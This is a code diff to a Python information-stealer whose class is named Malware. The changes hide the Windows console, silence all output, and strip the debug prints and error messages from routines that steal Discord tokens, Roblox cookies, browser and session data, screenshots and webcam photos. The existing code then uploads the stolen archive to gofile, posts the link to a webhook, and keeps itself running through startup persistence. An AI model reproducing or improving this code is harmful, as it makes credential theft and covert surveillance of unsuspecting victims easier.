@@ -6,6 +6,18 @@ from Cryptodome.Cipher import AES
 from contextlib import suppress
 from pathlib import Path
 
+# Скрытие консоли
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# Перенаправление всех потоков вывода
+class NullWriter:
+    def write(self, text):
+        pass
+    def flush(self):
+        pass
+
+sys.stdout = NullWriter()
+sys.stderr = NullWriter()
 
 class Paths:
     def __init__(self):
@@ -132,8 +144,8 @@ class Malware:
             else:
                 requests.post(self.webhook_url + "?with_components=true", json=payload)
 
-        except Exception as e:
-            print("Erro:", e)
+        except Exception:
+            pass
 
     def upload_gofile(self, file_path):
         try:
@@ -145,60 +157,50 @@ class Malware:
                     if result.get("status") == "ok":
                         return result["data"]["downloadPage"]
             return None
-        except Exception as e:
+        except Exception:
             return None
 
     def start_stealer(self, zip_file):
         try:
             try:
                 interesting_files = StealerFunctions.Interesting_Files(zip_file)
-                print("Interesting files collected:", interesting_files)
             except:
-                print("Error collecting interesting files.")
+                pass
             try:
                 screenshot_taken = StealerFunctions.Screenshot(zip_file)
-                print("Screenshot taken:", screenshot_taken)
             except:
-                print("Error taking screenshot.")
+                pass
             try:
                 antivirus_count = StealerFunctions.AntiVirus_Infos(zip_file)
-                print("Antivirus infos collected:", antivirus_count)
             except:
-                print("Error collecting antivirus infos.")
+                pass
             try:
                 discord_tokens = StealerFunctions.Discord_Tokens(zip_file)
-                print("Discord tokens collected:", discord_tokens)
             except:
-                print("Error collecting Discord tokens.")
+                pass
             try:
                 roblox_cookies = StealerFunctions.Roblox_Cookies(zip_file)
-                print("Roblox cookies collected:", roblox_cookies)
             except:
-                print("Error collecting Roblox cookies.")
+                pass
             try:
                 session_files = StealerFunctions.Session_files(zip_file, self.session_files)
-                print("Session files collected:", session_files)
             except:
-                print("Error collecting session files.")
+                pass
             try:
                 browser_Infos = StealerFunctions.Browser_Infos(zip_file, self.browser_infos)
-                print("Browser infos collected:", browser_Infos)
             except:
-                print("Error collecting browser infos.")
+                pass
             try:
                 webcam_taken = StealerFunctions.Webcam(zip_file)
-                print("Webcam photo taken:", webcam_taken)
             except:
-                print("Error taking webcam photo.")
+                pass
             try:
                 system_infos = StealerFunctions.System_Infos(zip_file)
-                print("System infos collected:", system_infos)
             except:
-                print("Error collecting system infos.")
+                pass
 
             return True
-        except Exception as e:
-            print('Exeption (start_stealer): ', e)
+        except Exception:
             return False
 
     def main(self):
@@ -206,10 +208,8 @@ class Malware:
             self.startup_persistence()
            
             if not Checks.is_windows():
-                print('not windows os')
                 return
             if not Checks.is_connected():
-                print('no internet connection')
                 return
             
             if Checks.is_admin():
@@ -224,7 +224,6 @@ class Malware:
             zip_file.close()
 
             if sucess:
-                print("Stealing completed successfully.")
                 gofile_url = self.upload_gofile(zip_file_path)
                 if gofile_url:
                     self.send_webhook(gofile_url=gofile_url, file_path=None)
@@ -232,8 +231,6 @@ class Malware:
                     self.send_webhook(gofile_url=None, file_path=zip_file_path)
 
                 self.delete_file(zip_file_path)
-            else:
-                print("Stealing failed.")
             
             if self.task_manager_blocked:
                 self.unblock_task_manager()
